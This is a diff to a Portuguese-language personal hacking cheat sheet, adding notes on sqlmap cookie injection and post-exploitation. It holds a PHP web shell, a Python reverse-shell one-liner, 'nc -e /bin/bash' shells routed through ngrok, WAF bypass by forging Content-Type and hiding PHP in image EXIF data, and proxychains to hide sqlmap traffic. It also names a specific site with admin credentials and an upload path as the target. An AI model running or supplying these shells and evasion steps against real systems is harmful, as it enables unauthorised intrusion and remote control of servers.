@@ -162,9 +162,9 @@ Exemplo de uso de um banco de dados msql:
 	
 	
 	
---- > aprender sql para iniciantes < ---
-	- > https://www.codecademy.com/catalog/language/sql
-	- > https://www.sqlcourse.com/beginner-course/
+					      --- > aprender sql para iniciantes < ---
+					- > https://www.codecademy.com/catalog/language/sql
+					- > https://www.sqlcourse.com/beginner-course/
 	
 -> Quebrar senhas md5 	
 #https://md5decrypt.net/en/
@@ -271,4 +271,66 @@ Exemplo de uso de um banco de dados msql:
 	--skip-waf - > desativa o scanner que o sqlmap faz do waf por padrão. 
 	--is-dba
 
- ---------------------------------------------- 						------------------------------------------------------
+        obs: Sqlmap também pode ser usado para fazer injeções sqlinjection nos cookies. Adiciona os cookies e passa como parametro -p cookies.       
+	 
+	      
+	      
+	      
+	      ----------------------------------------------    Shell upload 	------------------------------------------------------
+	- > Faze pós exploração. Após ter conseguido o banco de dados, tabelas, colunas, admin e senha. 
+		- Nada mais é do que fazer a página invadida executar comandos que serão executados no servidor - 
+-------------------------------	
+	-Exemplos usando shell reversa:  
+		nano file.php (php) 
+		<?php
+			echo shell_exec($_GET["comando"]);
+		?> 
+	python:
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); 	 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+	
+	-Mas e se não funcionar a injeção de shell? O firewall barrar injeções de códigos? O firewall pode está olhando dentro do arquivo e analisando o código.
+	1) Bypass 
+	
+	- > Podemos utilizar o burpsuit para analisar a requisição que faremos ( enviando o código malicioso ) e analisar o response do servidor. 
+	1 ) enviar o código malicioso e esperar o firewall responder/bloquear 
+	obs: analisando o response iremos observar o Content-Type ( Indica o tipo de mídia do recurso. ) que o firewall identifica. 
+	2 ) iremos enviar um novo arquivo modificando nosso Content-Type como jpg, por exemplo a fim de passar pela política de segurança.
+	
+	2) Bypass
+	
+	utilizar o exiftool ( manipular metadados de imagens ) e inserir o código malicioso em uma imagem. 
+	exiftool -comment="código malicioso" imagem.jpeg
+	exiftool -comment="<?php echo shell_exec(\$_GET[\"cmd\"]); ?>" imagem.jpeg
+	- > faz o upload do arquivo no servidor invadido e depois procura a imagem no "inspecionar código fonto da página" e clica na imagem 
+	imagem.jpeg?cmd = nc -e /bin/bash ip ngrok port 
+	
+	- > webshell mais completas 
+	#https://github.com/tennc
+	#https://r57.gen.tr/
+-------------------------------		
+	NGROK
+	./ngrok tcp 8080 
+	Forwarding - > ip externo que está direcionando para o ip real na porta 443/80
+	nc -lvp 443/80 
+ 	Por que utilizar porta 443/80? 
+	Porque são portas onde rodam, geralmente, HTTP ( páginas web ) no qual o firewall não bloqueia. No nosso caso, não irá bloquear a saída do bash 	para nossa maquina local.
+-------------------------------	
+	http://www.bancocn.com/admin/login.php
+	user: admin
+	senha: senhafoda 
+	
+	upload de=o arquivo file.php 
+	depois procura o upload file.php  
+	
+	http://www.bancocn.com/admin/uploads/
+	shell reversa: 
+	http://www.bancocn.com/admin/login.php?comando=nc -e /bin/bash ip ngrok 
+-------------------------------
+	Usando o sqlmap com proxychains4 
+	apt-get install proxychains4 
+	nano /etc/proxychains4.conf 
+	#dynamic_chain
+	#strict_chain
+	random_chain
+	adicionar socks - > https://spys.one/en/
+	proxychains4 sqlmap 
